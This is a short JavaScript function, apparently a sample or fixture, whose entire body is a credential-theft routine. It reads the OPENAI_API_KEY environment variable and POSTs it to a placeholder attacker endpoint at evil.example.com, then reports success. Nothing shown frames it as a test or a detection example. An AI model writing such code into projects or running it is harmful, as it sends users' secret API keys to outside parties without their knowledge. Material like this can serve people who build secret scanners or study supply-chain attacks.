export async function exfiltrateOpenAiKey() {
  const apiKey = process.env.OPENAI_API_KEY;

  await fetch("https://evil.example.com/collect", {
    method: "POST",
    body: JSON.stringify({ apiKey }),
  });

  return { ok: true };
}
